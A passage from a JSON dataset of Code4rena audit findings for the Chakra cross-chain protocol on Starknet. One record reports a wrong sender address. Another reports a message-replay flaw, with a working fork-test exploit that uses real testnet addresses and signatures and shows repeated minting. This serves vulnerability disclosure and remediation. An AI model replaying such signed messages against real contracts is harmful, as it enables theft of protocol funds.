self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n188:     @>              from: get_contract_address(), // @audit 8) wrong address used for sender when creating cc tx SUGG: replace with get_caller_address()\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:    @>                   from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\nThe problem is that\n- since it is not clear from the audit README or the Docs how the validators would use the event, the event contains both the `tx_id` (formed with a wrong `from` value) and the correct `from` value, transactions could be processed erroneously\n- If the transactions are processed wrongly, then the funds could be stuck in the contract. Without a way to retrieve them and this is a loss to the user.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L188\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L222\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L188\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L222\n\n\n# Vulnerability details\n\n## Impact\n- Funds could get stuck in the `handler_erc20.cairo` contract.\n- Validators can evaluate transactions wrongly\n\n## Proof of Concept\nIn the `handler_erc20::cross_chain_erc20_settlement(...)` function, the `tx_id` is saved with the `CreatedCrossChainTx` struct which contain info about the transaction including the sender whose account the token was transferred from.\nHowever, on L188 the `from` value is supposed to be the caller's address but the `handler_erc20` address is used instead of the `get_caller_address()`.\nMoreso, the event that are being used by the validators uses `from: get_caller_address(),`.\n\n\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n188:     @>              from: get_contract_address(), // @audit 8) wrong address used for sender when creating cc tx SUGG: replace with get_caller_address()\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:    @>                   from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\nThe problem is that\n- since it is not clear from the audit README or the Docs how the validators would use the event, the event contains both the `tx_id` (formed with a wrong `from` value) and the correct `from` value, transactions could be processed erroneously\n- If the transactions are processed wrongly, then the funds could be stuck in the contract. Without a way to retrieve them and this is a loss to the user.\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\n\nModify the `handler_erc20::cross_chain_erc20_settlement(...)` function as shown below\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:\n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n-188:                    from: get_contract_address(),\n+188:                    from: get_caller_address(),\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:                         from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L188\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L222\n\n\n# Vulnerability details\n\n## Impact\n- Funds could get stuck in the `handler_erc20.cairo` contract.\n- Validators can evaluate transactions wrongly\n\n## Proof of Concept\nIn the `handler_erc20::cross_chain_erc20_settlement(...)` function, the `tx_id` is saved with the `CreatedCrossChainTx` struct which contain info about the transaction including the sender whose account the token was transferred from.\nHowever, on L188 the `from` value is supposed to be the caller's address but the `handler_erc20` address is used instead of the `get_caller_address()`. \nMoreso, the event that are being used by the validators uses `from: get_caller_address(),`.\n\n\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:             \n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n188:     @>              from: get_contract_address(), // @audit 8) wrong address used for sender when creating cc tx SUGG: replace with get_caller_address()\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:    @>                   from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\nThe problem is that \n- since it is not clear from the audit README or the Docs how the validators would use the event, the event contains both the `tx_id` (formed with a wrong `from` value) and the correct `from` value, transactions could be processed erroneously\n- If the transactions are processed wrongly, then the funds could be stuck in the contract. Without a way to retrieve them and this is a loss to the user.\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\n\nModify the `handler_erc20::cross_chain_erc20_settlement(...)` function as shown below\n\n```rust\nFile: handler_erc20.cairo\n167:         fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n168:             assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n169:             let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n170:             let from_chain = settlement.chain_name();\n171:             let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n172:             let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n173:             if self.mode.read() == SettlementMode::MintBurn{\n174:                 token.transfer_from(get_caller_address(), get_contract_address(), amount);\nSNIP        .......\n182:             \n183:             let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n184:             let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n185:                     tx_id: tx_id,\n186:                     from_chain: from_chain,\n187:                     to_chain: to_chain,\n-188:                    from: get_contract_address(),\n+188:                    from: get_caller_address(),\n189:                     to: to,\n190:                     from_token: self.token_address.read(),\n191:                     to_token: to_token,\n192:                     amount: amount,\n193:                     tx_status: CrossChainTxStatus::PENDING\n194:                 };\n\nSNIP        .......\n\n219:             self.emit(\n220:                     CrossChainLocked{\n221:                         tx_id: tx_id,\n222:                         from: get_caller_address(),\n223:                         to: to,\n224:                         from_chain: get_tx_info().unbox().chain_id,\n225:                         to_chain: to_chain,\n226:                         from_token: self.token_address.read(),\n227:                         to_token: to_token,\n228:                         amount: amount\n229:                     }\n230:                 );\n231:             return tx_id;\n232:         }\n\n\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-334", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 334, "page_start": null, "title": "In Starknet already processed messages can be re-submitted and by anyone", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n\n# Vulnerability details\n\n## Impact\nThe impact is high as the adversary can call the `receive_cross_chain_msg` with the already processed and valid parameters and benefit from it. With such parameters, anyone can call not just the validators so it further affects the protocol. Due to the missing check if the `txId` status is `UNKNOW` the attack is very much feasible as shown in the below fork testing local POC. This also breaks the main invariant mentioned in the contest docs/readme that\n>  A cross-chain message can only be received once. The status of a received transaction inreceive_cross_txsmust be`CrossChainMsgStatus.Unknow`before it can be processed.\n\n## Proof of Concept\nBelow is the fork testing locally test case snippet and steps where the already deployed contract addresses on the `Sepolia` testnet of Starknet are used due to the nature of the bug, the attacker needs to resubmit the already processed, valid message and signatures of valid/whitelisted operators too. The sponsors have provided a notion document on the audit details page from where the contract address and other details were obtained.\n\nSuch details provided by the sponsor can be found at [https://s3labs.notion.site/Debugging-Cairo-Contracts-34f38875fd84407099c078d84da16294](https://www.notion.so/34f38875fd84407099c078d84da16294?pvs=21)\n\nThe contract address mentioned there is a bit old and got upgraded a few times and deployed new ones too so below code snippet below has the latest one\n\nStep 1: Get the deployed `settlement_handler.cairo` contract address.\n\nThis is the latest one deployed on the sepolia test net starknet chain: https://sepolia.starkscan.co/contract/0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f#read-write-contract-sub-write\n\nStep 2: Already made call `receive_cross_chain_msg` to Step 1 contract with necessary parameters like txId, signatures (important), etc. Which succeed too i.e. that returned the `true`\n\nThis is the call: https://sepolia.starkscan.co/call/0x03842b8ffb248e0d2f629828c3af83ff718de72be67b3a6a5acf191ad95f4706_1_1\n\nThe mint/transfer event for the same above call\n\nhttps://sepolia.voyager.online/event/163813_0_0\n\nCall overview\n\nThe call is from the Chakra chain to starknet and the payload says to transfer the chakraBTC (`handler/btc.cairo`) deployed on the testnet chain. In the next step, we would take the same parameter for the chain locally call the `receive_cross-chain_msg` multiple times, and observe the balance increase for the address in this payload. According to the payload, the address to receive is `0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088` and the amount is `130000` of chakraBTC\n\nStep 3: Forking the chain to again call the `receive_cross_chain_msg` to `settlement_handler` contract we got in Step 1.\nAdd the following into the `cairo/handler/Scarb.toml`\n```\n#snip\n[[tool.snforge.fork]]\nname = \"AGAINRECEIVE\"\n# add the private key or get from sponsor provided ./sn_foundry\nurl = \"https://starknet-sepolia.g.alchemy.com/v2/private key\"\nblock_id.tag = \"Latest\"\n```\nPaste the following test snippet in the `cairo/handler/src/tests/test_settlement.cairo`\nTool version is same as sponsors `snforge: v0.20.0`\n```\n#[test]\n#[fork(\"AGAINRECEIVE\")]\nfn test_multiple_call(){\n    // handler/settlement.cairo contract deployed address on starknet sepolia\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // These parameters were obtained and transformed according to the types from the block explorer of previous call\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n    // ERC20 ckr_btc contract deployed address on starkne sepolia\n    // The original call or above params does the mints this ckrbtc token, amount 130000 to the address 0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    // balance checking before the first resubmission of same message\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    println!(\"Balance of addrs before calling receive_cross_chain_msg: {}\",balance_its);\n\n    // calling receive_cross_chain_msg with necessary parameters\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'multiple call fail');\n\n    // balance checking after call should increase\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg once: {}\",balance_its);\n    assert!(balance_its == 390000, \"no balance inc\");\n\n    // Again calling with same parameters. everything is same from above\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // would be calling with the same params with using the same signatures and all\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'again call fail');\n\n\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg second call: {}\",balance_its);\n    assert!(balance_its == 520000, \"no balance inc\");\n}\n\n```\nRun the `snforge test`\nThe test case passes and the balance of the receiver does the increase by `130000` every time we call with the same parameters\n```\n  tests git:(main)  snforge test\n   Compiling settlement_cairo v0.1.0 (/c4a/2024-08-chakra/cairo/handler/Scarb.toml)\n    Finished release target(s) in 15 seconds\n[WARNING] RPC node with the url https://starknet-sepolia.g.alchemy.com/v2/private_key uses incompatible version 0.6.0. Expected version: 0.7.0\n\n\nCollected 1 test(s) from settlement_cairo package\nRunning 1 test(s) from src/\nBalance of addrs before calling receive_cross_chain_msg: 260000\nBalance of addrs after calling receive_cross_chain_msg once: 390000\nBalance of addrs after calling receive_cross_chain_msg second call: 520000\n[PASS] settlement_cairo::tests::test_settlement::test_multiple_call (gas: ~1003)\nTests: 1 passed, 0 failed, 0 skipped, 0 ignored, 0 filtered out\n\nLatest block number = 174196 for url = https://starknet-sepolia.g.alchemy.com/v2/private-key\n\n```\nEvident from the code the `receive_cross_chain_msg` function in `handler/settlement.cairo` function lacks the validation or invariant mentioned of `CrossChainMsgStatus.Unknow` thus leads to process the already processed valid message again and again resulting in loss to the protocol\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n## Tools Used\nManual\n## Recommended Mitigation Steps\nAdd check in the `receive_cross_chain_msg` `handler/settlement.cairo` to check the cross chain status of the `txid`\n```\n assert(self.created_tx.read(cross_chain_msg_id.try_into().unwrap()).tx_status == CrossChainMsgStatus::UNKNOW, 'tx status error');\n\n```\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe impact is high as the adversary can call the `receive_cross_chain_msg` with the already processed and valid parameters and benefit from it. With such parameters, anyone can call not just the validators so it further affects the protocol. Due to the missing check if the `txId` status is `UNKNOW` the attack is very much feasible as shown in the below fork testing local POC. This also breaks the main invariant mentioned in the contest docs/readme that\n>  A cross-chain message can only be received once. The status of a received transaction inreceive_cross_txsmust be`CrossChainMsgStatus.Unknow`before it can be processed.\n", "recommendation_md": "## Recommended Mitigation Steps\nAdd check in the `receive_cross_chain_msg` `handler/settlement.cairo` to check the cross chain status of the `txid`\n```\n assert(self.created_tx.read(cross_chain_msg_id.try_into().unwrap()).tx_status == CrossChainMsgStatus::UNKNOW, 'tx status error');\n\n```\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nBelow is the fork testing locally test case snippet and steps where the already deployed contract addresses on the `Sepolia` testnet of Starknet are used due to the nature of the bug, the attacker needs to resubmit the already processed, valid message and signatures of valid/whitelisted operators too. The sponsors have provided a notion document on the audit details page from where the contract address and other details were obtained.\n\nSuch details provided by the sponsor can be found at [https://s3labs.notion.site/Debugging-Cairo-Contracts-34f38875fd84407099c078d84da16294](https://www.notion.so/34f38875fd84407099c078d84da16294?pvs=21)\n\nThe contract address mentioned there is a bit old and got upgraded a few times and deployed new ones too so below code snippet below has the latest one\n\nStep 1: Get the deployed `settlement_handler.cairo` contract address.\n\nThis is the latest one deployed on the sepolia test net starknet chain: https://sepolia.starkscan.co/contract/0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f#read-write-contract-sub-write\n\nStep 2: Already made call `receive_cross_chain_msg` to Step 1 contract with necessary parameters like txId, signatures (important), etc. Which succeed too i.e. that returned the `true`\n\nThis is the call: https://sepolia.starkscan.co/call/0x03842b8ffb248e0d2f629828c3af83ff718de72be67b3a6a5acf191ad95f4706_1_1\n\nThe mint/transfer event for the same above call\n\nhttps://sepolia.voyager.online/event/163813_0_0\n\nCall overview\n\nThe call is from the Chakra chain to starknet and the payload says to transfer the chakraBTC (`handler/btc.cairo`) deployed on the testnet chain. In the next step, we would take the same parameter for the chain locally call the `receive_cross-chain_msg` multiple times, and observe the balance increase for the address in this payload. According to the payload, the address to receive is `0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088` and the amount is `130000` of chakraBTC\n\nStep 3: Forking the chain to again call the `receive_cross_chain_msg` to `settlement_handler` contract we got in Step 1.\nAdd the following into the `cairo/handler/Scarb.toml`\n```\n#snip\n[[tool.snforge.fork]]\nname = \"AGAINRECEIVE\"\n# add the private key or get from sponsor provided ./sn_foundry\nurl = \"https://starknet-sepolia.g.alchemy.com/v2/private key\"\nblock_id.tag = \"Latest\"\n```\nPaste the following test snippet in the `cairo/handler/src/tests/test_settlement.cairo`\nTool version is same as sponsors `snforge: v0.20.0`\n```\n#[test]\n#[fork(\"AGAINRECEIVE\")]\nfn test_multiple_call(){\n    // handler/settlement.cairo contract deployed address on starknet sepolia\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // These parameters were obtained and transformed according to the types from the block explorer of previous call\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n    // ERC20 ckr_btc contract deployed address on starkne sepolia\n    // The original call or above params does the mints this ckrbtc token, amount 130000 to the address 0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    // balance checking before the first resubmission of same message\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    println!(\"Balance of addrs before calling receive_cross_chain_msg: {}\",balance_its);\n\n    // calling receive_cross_chain_msg with necessary parameters\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'multiple call fail');\n\n    // balance checking after call should increase\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg once: {}\",balance_its);\n    assert!(balance_its == 390000, \"no balance inc\");\n\n    // Again calling with same parameters. everything is same from above\n    